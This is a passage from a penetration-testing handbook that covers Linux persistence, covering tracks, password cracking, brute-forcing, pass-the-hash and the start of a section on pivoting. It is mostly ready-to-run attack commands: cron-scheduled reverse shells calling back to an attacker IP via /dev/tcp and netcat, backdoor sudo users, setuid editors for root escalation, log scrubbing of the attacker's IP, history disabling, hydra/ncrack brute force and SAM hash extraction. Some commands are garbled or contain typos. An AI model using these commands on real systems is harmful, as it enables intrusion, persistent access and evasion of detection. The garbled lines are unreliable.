dumping.
use auxiliary/sniffer/psnuffle
https://www.offensive-security.com/metasploit-unleashed/password-sniffing/
References
204
Loot Linux
http://www.thegeekstuff.com/2010/08/tcpdump-command-examples/
https://danielmiessler.com/study/tcpdump/
https://www.sans.org/reading-room/whitepapers/testing/post-exploitation-metasploit-pivot-port-33909
http://jvns.ca/blog/2016/03/16/tcpdump-is-amazing/
205
Persistence
Persistence
Persistence - Rootkit - Backdoor
So if you manage to compromise a system you need to make sure that you do not lose the shell. If you
have used an exploit that messes with the machine the user might want to reboot, and if the user
reboots you will lose your shell.
Or, maybe the way to compromise the machine is really complicated or noisy and you don't want to
go through the hassle of doing it all again. So instead you just create a backdoor that you can enter
fast and easy.
Create a new user
The most obvious, but not so subtle way is to just create a new user (if you are root, or someone with
that privilege) .
adduser pelle
adduser pelle sudo
Now if the machine has ssh you will be able to ssh into the machine.
On some machines, older Linux I think, you have to do
useradd pelle
passwd pelle
echo "pelle ALL=(ALL) ALL" >> /etc/sudoers
Crack the password of existing user
Get the /etc/shadow file and crack the passwords. This is of course only persistent until the user
decides to change his/her password. So not so good.
SSH key
Add key to existing ssh-account.
Cronjob NC
Create cronjob that connects to your machine every 10 minutes. Here is an example using a bash-
reverse-shell. You also need to set up a netcat listener.
Here is how you check if cronjob is active
service crond status
pgrep cron
If it is not started you can start it like this
206
Persistence
service crond status
/etc/init.d/cron start
crontab -e
*/10 * * * * 0/dev/tcp/192.168.1.102/5556; sh &196 2>&196
/10 * * * * nc -e /bin/sh 192.168.1.21 5556
Listener
nc -lvp 5556
Sometimes you have to set the user
crontab -e
*/10 * * * * pelle /path/to/binary
More here: http://kaoticcreations.blogspot.cl/2012/07/backdooring-unix-system-via-cron.html
Metasploit persistence module
Create a binary with malicious content inside. Run that, get meterpreter shell, run metasploit
persistence.
https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/
If you have a meterpreter shell you can easily just run persistence.
Backdoor in webserver
You can put a cmd or shell-backdoor in a webserver.
Put backdoor on webserver, either in separate file or in hidden in another file
Admin account to CMS
Add admin account to CMS.
Mysql-backdoor
Mysql backdoor
Hide backdoor in bootblock
Nmap
If the machine has nmap installed:
https://gist.github.com/dergachev/7916152
Setuid on text-editor
207
Persistence
You can setuid on an editor. So if you can easily enter as a www-data, you can easily escalate to root
through the editor.
With vi it is extremely easy. You just run :shell, and it gives you a shell.
# Make root the owner of the file
chown root myBinary
# set the sticky bit/suid
chmod u+s myBinary
References
Read this https://gist.github.com/dergachev/7916152
This is a creat introduction http://www.dankalia.com/tutor/01005/0100501002.htm
208
Cover your tracks
Cover your tracks
Cover your tracks
http://www.dankalia.com/tutor/01005/0100501003.htm
On Linux
Log files
/etc/syslog.conf
In this file you can read all the logs that syslog log.
On linux systems a lot of logs are stored in:
/var/logs
For example:
/var/log/messages
Here you have failed and successful login attempts. SSH, SUDO, and much more.
/var/log/auth.log
Apache
/var/log/apache2/access.log
/var/log/apache2/error.log
Remove your own ip like this
grep -v '' /path/to/access_log > a && mv a /path/to/access_log
What it does is simply to copy all lines except the lines that contain your IP-address. And then move
them, and them move them back again.
grep -v   > /tmp/a ; mv /tmp/a  ; rm -f /tmp/a
UTMP and WTMP
These logs are not stored in plaintext but instead as binaries. Which makes it a bit harder to clear.
who
last
lastlog
Command history
209
Cover your tracks
All your commands are also stored.
echo $HISTFILE
echo $HISTSIZE
You can set your file-size like this to zero, to avoid storing commands.
export HISTSIZE=0
If you set it when you get shell you won't have to worry about cleaning up the history.
Shred files
Shredding files lets you remove files in a more secure way.
shred -zu filename
On windows
Clear env https://www.offensive-security.com/metasploit-unleashed/event-log-management/
210
Password Cracking
Password Cracking
Password Cracking
Generate wordlists
Offline
Online
Pass the hash
211
Generate Custom Wordlist
Generate Custom Wordlist
Generate custom wordlist
Cracking passwords is good to know.
If we are able to do a dictionary-attack against a service it is important that we use a good dictionary.
We can use e generic one. But we can also generate a custom wordlist based on certain criteria. That
is what we are going to do in this chapter.
Remember people often use their birth dates, address, street address, pets, family members, etc.
Who is the target?
The target might be a specific company or person.
Password rules
The service you want to hack might have specific password rules. Must contain certain characters,
must be of certain length etc.
Combine a small/semi-small dict with a custom
To combine two wordlists you can just do
cat wordlist.txt >> wordlist2.txt
Create a custom wordlist
Html2dic - Build dictionary from html
You can build a dictionary from a html-page.
curl http://example.com > example.txt
Then run:
html2dic example.txt
Then you should probably remove duplicates.
Cewl - Spider and build dictionary
cewl -w createWordlist.txt https://www.example.com
Add minimum password length:
cewl -w createWordlist.txt -m 6 https://www.example.com
Improve the custom wordlist
212
Generate Custom Wordlist
As we all know few password are just simple words. Many use numbers and special characters. To
improve our password list we can use john the ripper. We can input our own rules, or we can just use
the standard john-the-ripper rules
john ---wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt
References
http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-4-creating-custom-
wordlist-with-crunch-0156817/
213
Offline Password Cracking
Offline Password Cracking
Offline password cracking
We might find passwords or other credentials in databases. These are often hashed, so we need to first
identify which hash it is and then try to crack it. The first step is to identify the hash-algorithm that
was used to hash the password.
Identify hash
There are generally speaking three pieces of data we can use to identify a hash.
The length of the hash
The character set
Any special characters
In order to identify a hash we can either use specialized tools that analyze the hash and then return a
guess on which algorithm it is. An easier way is of course to just look in the documentation of the
software where you found the hashes. It usually says in the documentation or the source code which
type of hash is being used.
In kali we can use hash-identifier or hashid:
hash-identifier
hashid
Or try these online services:
http://www.onlinehashcrack.com/hash-identification.php
https://md5hashing.net/hash_type_checker
Cracking the hash
Okay so now we know what hash it is, let's get cracking.
If you want to try out the functionality of hashcat or john the ripper you can find example hashes
here: http://openwall.info/wiki/john/sample-hashes.
Hashcat
Look for the specific type of hash you want to crack in the list produced by the following command:
hashcat --help
My hash was a Apache md5, so I will use the corresponding code for it, 1600
-a 0 - straight
-o found.txt - where the cracked hash outputs
214
Offline Password Cracking
`admin.hash" - the hash you want to crack.
/usr/share/hashcat/rules/rockyou-30000.rule - the wordlist we use
hashcat -m 11 -a 0 -o found.txt admin.hash /usr/share/hashcat/rules/rockyou-30000.rule
John the ripper
So this is how you usually crack passwords with john
john --wordlist=wordlist.txt dump.txt
If you do not find the password you can add the john-rules. Which add numbers and such things to
each password.
john --rules --wordlist=wordlist.txt dump.txt
Linux shadow password
First you need to combine the passwd file with the shadow file using the unshadow-program.
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
john --rules --wordlist=wordlist.txt unshadowed.txt
Rainbow tables
So basically a rainbow table is a precalculated list of passwords. So instead of having to hash the
word you want to try you create a list of hashes. So you do not have to hash them before comparing.
This might take a long time to do, hashing a whole wordlist, but when you do the comparison
between the password and the test-word it will go a lot faster.
Using Online Tools
findmyhash
You can use findmyhash
Here is an example of how to use it:
findmyhash LM -h 6c3d4c343f999422aad3b435b51404ee:bcd477bfdb45435a34c6a38403ca4364
Cracking
Crackstation https://crackstation.net/
Hashkiller https://hashkiller.co.uk/
Google hashes Search pastebin.
Windows
If you find a local file inclusion vulnerability you might be able to retrieve two fundamental files from
it. the system registry and the SAM registry. There two files/registries are all we need to get the
215
Offline Password Cracking
machines hashes. These files can be found in several different locations in windows. Here they are:
Systemroot can be windows
%SYSTEMROOT%\repair\SAM
windows\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
System file can be found here
SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\RegBack\system
So if the manage to get your hands on both of these files you can extract the password hashed like
this:
pwdump system sam
216
Online Password Cracking
Online Password Cracking
Online password cracking
There are several tools specialized for bruteforcing online. There are several different services that are
common for bruteforce. For example: VNC, SSH, FTP, SNMP, POP3, HTTP.
Port 22 - SSH
hydra -l root -P wordlist.txt 192.168.0.101 ssh
hydra -L userlist.txt -P best1050.txt 192.168.1.103 -s 22 ssh -V
Port 80/443 htaccess
You can password protect directories with apache pretty easily. Just configure the htaccess (I exaplin
this in the chapter on Common ports).
It can then be brute forced like this:
medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
Logins
Use Burp suite.
1. Intecept a login attempt.
2. Right-lick "Send to intruder". Select Sniper if you have nly one field you want to bruteforce. If
you for example already know the username. Otherwise select cluster-attack.
3. Select your payload, your wordlist.
4. Click attack.
5. Look for response-length that differs from the rest.
Port 161 - SNMP
hydra -P wordlist.txt -v 102.168.0.101 snmp
Port 3389 - Remote Desktop Protocol
For RDP we can use Ncrack.
ncrack -vv --user admin -P password-file.txt rdp://192.168.0.101
217
Pass the Hash - Reusing Hashes
Pass the Hash - Reusing Hashes
Pass the hash - reusing hashes
Pass the hash (PTH) is a technique that lets the user authenticate by using a valid username and the
hash, instead of the unhashed password. So if you have gotten a hold of a hash you might be able to
use that hash against another system.
Pass the hash is a suite of different tools.
SMB
So in order to use pass the hash we first need to put the hash in a env variable using the export
command:
So we will atuhenticate against a smb-service.
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
pth-winexe -U administrator //192.168.1.101 cmd
I think you can run it like this too:
pth-winexe -U admin/hash:has //192.168.0.101 cmd
Remote Desktop
apt-get update
apt-get install freerdp-x11
xfreerdp /u:admin /d:win7 /pth:hash:hash /v:192.168.1.101
https://www.kali.org/penetration-testing/passing-hash-remote-desktop/
218
Pivoting - Port forwarding - Tunneling
Pivoting - Port forwarding - Tunneling
Pivoting
Let's say that you have compromised one machine on a network and you want to keep going to
another machine. You will use the first machine as a staging point/plant/foothold to break into
machine 2. The technique of using one compromised machine to access another is called pivoting.
Machine one is the pivot in the example. The pivot is just used as a way to channel/tunnel our
attack.
Ipconfig
We are looking for machines that have at least THREE network interfaces (loopback, eth0, and eth1
(or something)). These machines are connected to other networks, so we can use them to pivot.
# Windows
ipconfig /all
route print
#Linux
ifconfig
ifconfig -a
Port forwarding and tunneling
Port forwarding
So imagine that you are on a network and you want to connect to a ftp server (or any other port) to
upload or download some files. But someone has put some crazy firewall rules (egress filters) that
prohibits outgoing traffics on all ports except for port 80. So how are we going to be able to connect
to our ftp-server?
What we can do is add a machine that redirect/forward all traffic that it receives on port 80 to port 21
on a different machine.
So instead of having this kind of traffic
home-computer/port-21 ----> ftp-server/port-21
we will have
home-computer/port-80 ----> port-80/proxy-machine/port-21 ----> ftp-server
And the other way around of course, to receive the traffic.
Okay, so how do we go about actually implementing this?
Rinetd - Port forward/redirect
219
Pivoting - Port forwarding - Tunneling
So we can set up this port forwarding machine with the help of rinetd.
To make it clear, we have the following machines: Machine1 - IP: 111.111.111.111 - Behind firewall,
and wants to connect to Machine3. Machine2 - IP: 222.222.222.222 - Forwards incomming
connections to Machine3 Machine3 - IP: 333.333.333.333 - Hosts the ftp-server that machine1 wants
to connect to.